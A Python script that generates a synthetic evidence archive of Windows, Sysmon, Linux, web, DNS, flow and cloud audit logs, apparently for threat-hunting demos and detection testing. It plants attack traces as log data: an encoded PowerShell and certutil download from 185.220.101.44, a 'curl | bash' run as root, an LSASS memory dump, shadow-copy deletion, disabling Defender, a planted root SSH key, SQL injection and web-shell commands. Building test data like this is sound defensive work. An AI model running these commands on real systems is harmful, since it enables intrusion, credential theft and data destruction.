"""Generate a realistic evidence archive for demonstrations and testing.

The archive contains Windows, Sysmon, Linux, web, DNS, flow and CloudTrail
logs. Benign activity dominates, with a small number of attack behaviours
planted so that the engine has something true to find.
"""

from __future__ import annotations

import argparse
import json
import random
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

BASE = datetime(2026, 3, 11, 6, 0, 0, tzinfo=timezone.utc)
HOSTS = ["WS-FIN-014", "WS-HR-022", "WS-ENG-101", "SRV-FILE-01", "SRV-APP-02", "DC-CORP-01"]
USERS = ["j.dupont", "m.laurent", "a.schmidt", "svc_backup", "p.novak", "c.moreau"]
INTERNAL = ["10.20.4.15", "10.20.4.31", "10.20.5.77", "10.20.9.10", "10.20.9.11", "10.20.1.5"]
BENIGN_DOMAINS = [
    "www.microsoft.com", "login.microsoftonline.com", "cdn.jsdelivr.net", "api.github.com",
    "outlook.office365.com", "teams.microsoft.com", "update.googleapis.com", "www.deloitte.com",
]
BENIGN_PROCESSES = [
    ("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\services.exe"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "C:\\Windows\\explorer.exe"),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\taskhostw.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Program Files\\Notepad++\\notepad++.exe", "C:\\Windows\\explorer.exe"),
]


def ts(offset_seconds: float) -> datetime:
    return BASE + timedelta(seconds=offset_seconds)


def iso(offset_seconds: float) -> str:
    return ts(offset_seconds).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def windows_security(rng: random.Random) -> str:
    lines = []
    for index in range(600):
        offset = index * 37 + rng.uniform(0, 15)
        host = rng.choice(HOSTS)
        user = rng.choice(USERS)
        lines.append(json.dumps({
            "@timestamp": iso(offset),
            "Channel": "Security",
            "EventID": 4624,
            "Computer": host,
            "TargetUserName": user,
            "TargetDomainName": "CORP",
            "LogonType": rng.choice([2, 3, 3, 3, 7]),
            "IpAddress": rng.choice(INTERNAL),
            "LogonProcessName": "Kerberos",
        }))
    # Password spray from one external address against many accounts.
    spray_targets = USERS + ["admin", "administrator", "backup", "sql_svc", "test", "helpdesk"]
    for index, target in enumerate(spray_targets * 3):
        lines.append(json.dumps({
            "@timestamp": iso(9000 + index * 11),
            "Channel": "Security",
            "EventID": 4625,
            "Computer": "DC-CORP-01",
            "TargetUserName": target,
            "TargetDomainName": "CORP",
            "LogonType": 3,
            "IpAddress": "45.155.205.87",
            "Status": "0xC000006D",
        }))
    # Successful remote desktop logon from a public address.
    lines.append(json.dumps({
        "@timestamp": iso(9600),
        "Channel": "Security",
        "EventID": 4624,
        "Computer": "SRV-APP-02",
        "TargetUserName": "svc_backup",
        "TargetDomainName": "CORP",
        "LogonType": 10,
        "IpAddress": "45.155.205.87",
        "LogonProcessName": "User32",
    }))
    # Privileged group change and audit log clear.
    lines.append(json.dumps({
        "@timestamp": iso(10200),
        "Channel": "Security",
        "EventID": 4728,
        "Computer": "DC-CORP-01",
        "SubjectUserName": "svc_backup",
        "TargetUserName": "helpdesk_temp",
        "TargetDomainName": "CORP",
        "GroupName": "Domain Admins",
    }))
    lines.append(json.dumps({
        "@timestamp": iso(12600),
        "Channel": "Security",
        "EventID": 1102,
        "Computer": "SRV-APP-02",
        "SubjectUserName": "svc_backup",
        "Message": "The audit log was cleared",
    }))
    # Kerberoasting burst.
    for index in range(18):
        lines.append(json.dumps({
            "@timestamp": iso(10800 + index * 9),
            "Channel": "Security",
            "EventID": 4769,
            "Computer": "DC-CORP-01",
            "TargetUserName": "svc_backup@corp.local",
            "ServiceName": f"MSSQLSvc/app{index:02d}.corp.local:1433",
            "TicketEncryptionType": "0x17",
            "IpAddress": "10.20.9.11",
        }))
    return "\n".join(lines) + "\n"


def sysmon_xml(rng: random.Random) -> str:
    def event(offset, host, user, image, parent, command, event_id=1):
        return (
            '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
            '<Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>'
            f"<EventID>{event_id}</EventID>"
            f'<TimeCreated SystemTime="{iso(offset)}"/>'
            f"<Computer>{host}</Computer>"
            "<Channel>Microsoft-Windows-Sysmon/Operational</Channel></System><EventData>"
            f'<Data Name="Image">{image}</Data>'
            f'<Data Name="CommandLine">{command}</Data>'
            f'<Data Name="ParentImage">{parent}</Data>'
            f'<Data Name="User">CORP\\{user}</Data>'
            "</EventData></Event>"
        )

    lines = ['<?xml version="1.0" encoding="utf-8"?>', "<Events>"]
    for index in range(400):
        image, parent = rng.choice(BENIGN_PROCESSES)
        lines.append(event(index * 41 + rng.uniform(0, 10), rng.choice(HOSTS), rng.choice(USERS),
                           image, parent, f"{image} /background"))
    # Phishing chain: Word spawns encoded PowerShell, which uses certutil.
    lines.append(event(
        9300, "WS-FIN-014", "j.dupont",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "powershell.exe -nop -w hidden -enc "
        "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANAAvAGEALgBwAHMAMQAnACkA",
    ))
    lines.append(event(
        9360, "WS-FIN-014", "j.dupont",
        "C:\\Windows\\System32\\certutil.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "certutil.exe -urlcache -split -f http://185.220.101.44/update.dat C:\\Users\\Public\\update.dat",
    ))
    # Credential dumping and recovery inhibition.
    lines.append(event(
        11400, "SRV-APP-02", "svc_backup",
        "C:\\Windows\\System32\\rundll32.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 748 C:\\Users\\Public\\lsass.dmp full",
    ))
    lines.append(event(
        12000, "SRV-FILE-01", "svc_backup",
        "C:\\Windows\\System32\\vssadmin.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "vssadmin.exe delete shadows /all /quiet",
    ))
    lines.append(event(
        12060, "SRV-FILE-01", "svc_backup",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
    ))
    # Discovery burst.
    for index, command in enumerate([
        "whoami.exe /all", "net.exe group \"Domain Admins\" /domain", "nltest.exe /domain_trusts",
        "systeminfo.exe", "net.exe view /domain", "quser.exe",
    ]):
        lines.append(event(10500 + index * 12, "SRV-APP-02", "svc_backup",
                           f"C:\\Windows\\System32\\{command.split()[0]}",
                           "C:\\Windows\\System32\\cmd.exe", command))
    # Data staging archive.
    lines.append(event(
        12300, "SRV-FILE-01", "svc_backup",
        "C:\\Program Files\\7-Zip\\7z.exe", "C:\\Windows\\System32\\cmd.exe",
        "7z.exe a -tzip -pR4nsom2026 C:\\Users\\Public\\finance.zip \\\\SRV-FILE-01\\Finance\\*",
    ))
    lines.append("</Events>")
    return "\n".join(lines) + "\n"


def linux_auth(rng: random.Random) -> str:
    lines = []
    for index in range(150):
        moment = ts(index * 90).strftime("%b %d %H:%M:%S")
        lines.append(f"{moment} srv-web-01 sshd[{2000 + index}]: Accepted publickey for deploy from 10.20.5.44 port 5{index % 1000:03d} ssh2")
    # SSH brute force from a public address.
    for index in range(60):
        moment = ts(9000 + index * 4).strftime("%b %d %H:%M:%S")
        user = rng.choice(["root", "admin", "oracle", "postgres", "test", "ubuntu"])
        lines.append(f"{moment} srv-web-01 sshd[{5000 + index}]: Failed password for invalid user {user} from 91.240.118.172 port {40000 + index} ssh2")
    lines.append(f"{ts(9300).strftime('%b %d %H:%M:%S')} srv-web-01 sshd[5100]: Accepted password for oracle from 91.240.118.172 port 41022 ssh2")
    lines.append(f"{ts(9360).strftime('%b %d %H:%M:%S')} srv-web-01 sudo:  oracle : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl -s http://185.220.101.44/x.sh | bash'")
    lines.append(f"{ts(9420).strftime('%b %d %H:%M:%S')} srv-web-01 useradd[5150]: new user: name=svcmon, UID=0, GID=0, home=/home/svcmon, shell=/bin/bash")
    lines.append(f"{ts(9480).strftime('%b %d %H:%M:%S')} srv-web-01 bash[5170]: echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9' >> /root/.ssh/authorized_keys")
    lines.append(f"{ts(9540).strftime('%b %d %H:%M:%S')} srv-web-01 bash[5180]: history -c && rm -f /root/.bash_history")
    return "\n".join(lines) + "\n"


def web_access(rng: random.Random) -> str:
    lines = []
    paths = ["/", "/index.html", "/api/v1/orders", "/static/app.js", "/health", "/api/v1/users/me"]
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    ]
    for index in range(700):
        moment = ts(index * 25).strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines.append(
            f'{rng.choice(INTERNAL)} - - [{moment}] "GET {rng.choice(paths)} HTTP/1.1" 200 {rng.randint(300, 9000)} '
            f'"-" "{rng.choice(agents)}"'
        )
    # SQL injection and directory brute force from one attacker.
    for index in range(70):
        moment = ts(8000 + index * 3).strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines.append(
            f'203.0.113.45 - - [{moment}] "GET /admin/{rng.choice(["backup", "config", "db", ".git/config", "wp-login.php", "phpmyadmin"])}{index} HTTP/1.1" 404 162 '
            f'"-" "gobuster/3.6"'
        )
    for index in range(6):
        moment = ts(8400 + index * 20).strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines.append(
            f'203.0.113.45 - - [{moment}] "GET /api/v1/orders?id=1%27+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 15234 '
            f'"-" "sqlmap/1.8.2#stable (http://sqlmap.org)"'
        )
    moment = ts(8600).strftime("%d/%b/%Y:%H:%M:%S +0000")
    lines.append(
        f'203.0.113.45 - - [{moment}] "POST /uploads/shell.php HTTP/1.1" 200 42 "-" "python-requests/2.31.0"'
    )
    moment = ts(8700).strftime("%d/%b/%Y:%H:%M:%S +0000")
    lines.append(
        f'203.0.113.45 - - [{moment}] "GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1832 "-" "python-requests/2.31.0"'
    )
    return "\n".join(lines) + "\n"


def dns_log(rng: random.Random) -> str:
    header = "#separator \\x09\n#path\tdns\n#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tquery\tqtype_name\n"
    rows = []
    for index in range(500):
        rows.append("\t".join([
            f"{(BASE + timedelta(seconds=index * 30)).timestamp():.6f}",
            f"C{index:08d}", rng.choice(INTERNAL), str(rng.randint(1024, 65535)),
            "10.20.1.5", "53", rng.choice(BENIGN_DOMAINS), "A",
        ]))
    dga = ["kq3v9zxlwmnbrtd", "xzqvbnmwrtlkjhg", "pwzkxmvbnqrtylw", "vbnqwrtzxkmlpyh", "zxcvbnmqwrtylkj"]
    for index, label in enumerate(dga):
        for repeat in range(6):
            rows.append("\t".join([
                f"{(BASE + timedelta(seconds=9000 + index * 300 + repeat * 47)).timestamp():.6f}",
                f"D{index:04d}{repeat}", "10.20.4.15", "51000", "10.20.1.5", "53",
                f"{label}.xyz", "A",
            ]))
    # Long label tunnelling.
    for index in range(12):
        rows.append("\t".join([
            f"{(BASE + timedelta(seconds=11000 + index * 60)).timestamp():.6f}",
            f"T{index:04d}", "10.20.4.15", "51001", "10.20.1.5", "53",
            f"{'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0' + str(index)}.tunnel.top", "TXT",
        ]))
    return header + "\n".join(rows) + "\n"


def flow_log(rng: random.Random) -> str:
    lines = ["timestamp,src_ip,src_port,dst_ip,dst_port,protocol,bytes_out,bytes_in,action"]
    for index in range(600):
        lines.append(",".join([
            iso(index * 30 + rng.uniform(0, 10)), rng.choice(INTERNAL), str(rng.randint(1024, 65535)),
            f"104.18.{rng.randint(1, 40)}.{rng.randint(1, 250)}", "443", "tcp",
            str(rng.randint(400, 90000)), str(rng.randint(1000, 900000)), "allow",
        ]))
    # Beacon every 60 seconds with light jitter.
    for index in range(90):
        offset = 8000 + index * 60 + rng.uniform(-2.0, 2.0)
        lines.append(",".join([
            iso(offset), "10.20.4.15", str(rng.randint(49152, 65535)),
            "185.220.101.44", "8443", "tcp", "1420", "3180", "allow",
        ]))
    # Bulk exfiltration session.
    lines.append(",".join([iso(12500), "10.20.9.10", "50210", "45.155.205.87", "443", "tcp",
                           "8400000000", "22000", "allow"]))
    return "\n".join(lines) + "\n"


def cloudtrail(rng: random.Random) -> str:
    records = []
    for index in range(120):
        records.append({
            "eventTime": iso(index * 120),
            "eventSource": "s3.amazonaws.com",
            "eventName": rng.choice(["GetObject", "ListBucket", "PutObject", "HeadObject"]),
            "awsRegion": "eu-west-1",
            "sourceIPAddress": "10.20.9.55",
            "userIdentity": {"type": "AssumedRole", "userName": "app-runtime",
                             "arn": "arn:aws:sts::123456789012:assumed-role/app-runtime/i-0abc"},
            "recipientAccountId": "123456789012",
        })
    attacker = [
        ("CreateAccessKey", "iam.amazonaws.com"),
        ("AttachUserPolicy", "iam.amazonaws.com"),
        ("StopLogging", "cloudtrail.amazonaws.com"),
        ("PutBucketAcl", "s3.amazonaws.com"),
        ("DeleteBackupVault", "backup.amazonaws.com"),
    ]
    for index, (name, source) in enumerate(attacker):
        records.append({
            "eventTime": iso(11500 + index * 90),
            "eventSource": source,
            "eventName": name,
            "awsRegion": "eu-west-1",
            "sourceIPAddress": "45.155.205.87",
            "userIdentity": {"type": "IAMUser", "userName": "ci-deploy",
                             "arn": "arn:aws:iam::123456789012:user/ci-deploy"},
            "recipientAccountId": "123456789012",
        })
    for index in range(40):
        records.append({
            "eventTime": iso(11000 + index * 8),
            "eventSource": "ec2.amazonaws.com",
            "eventName": rng.choice(["DescribeInstances", "DescribeSecurityGroups", "ListUsers",
                                     "ListRoles", "DescribeVpcs", "GetCallerIdentity", "ListBuckets",
                                     "DescribeSnapshots", "ListAccessKeys", "GetAccountSummary"]),
            "awsRegion": "eu-west-1",
            "sourceIPAddress": "45.155.205.87",
            "userIdentity": {"type": "IAMUser", "userName": "ci-deploy",
                             "arn": "arn:aws:iam::123456789012:user/ci-deploy"},
            "recipientAccountId": "123456789012",
        })
    return json.dumps({"Records": records}, indent=1)


def m365_audit(rng: random.Random) -> str:
    rows = ["CreationDate,UserIds,Operations,ClientIP,Workload,RecordType,ResultStatus"]
    for index in range(200):
        rows.append(",".join([
            iso(index * 60), rng.choice(USERS) + "@corp.example",
            rng.choice(["FileAccessed", "MailItemsAccessed", "UserLoggedIn", "FileDownloaded"]),
            rng.choice(INTERNAL), "Exchange", "2", "Success",
        ]))
    rows.append(",".join([iso(11800), "p.novak@corp.example", "New-InboxRule", "45.155.205.87",
                          "Exchange", "1", "Success"]))
    rows.append(",".join([iso(11900), "p.novak@corp.example", "Set-Mailbox", "45.155.205.87",
                          "Exchange", "1", "Success"]))
    rows.append(",".join([iso(12000), "admin@corp.example", "Consent to application", "45.155.205.87",
                          "AzureActiveDirectory", "8", "Success"]))
    rows.append(",".join([iso(12100), "admin@corp.example", "Update StrongAuthenticationMethod",
                          "45.155.205.87", "AzureActiveDirectory", "8", "Success"]))
    return "\n".join(rows) + "\n"


def build(destination: Path, seed: int = 7) -> Path:
    rng = random.Random(seed)
    files = {
        "windows/security-events.json": windows_security(rng),
        "windows/sysmon-operational.xml": sysmon_xml(rng),
        "linux/auth.log": linux_auth(rng),
        "web/access.log": web_access(rng),
        "network/dns.log": dns_log(rng),
        "network/firewall-flows.csv": flow_log(rng),
        "cloud/cloudtrail.json": cloudtrail(rng),
        "cloud/m365-audit.csv": m365_audit(rng),
        "README.txt": "Synthetic evidence generated for Threat Hunting Factory demonstrations.\n",
    }
    destination.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(destination, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, content in files.items():
            archive.writestr(name, content)
    return destination


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate a sample evidence archive")
    parser.add_argument("output", nargs="?", default="sample-evidence.zip")
    parser.add_argument("--seed", type=int, default=7)
    args = parser.parse_args()
    path = build(Path(args.output), args.seed)
    print(f"Wrote {path} ({path.stat().st_size / 1024:.1f} KB)")
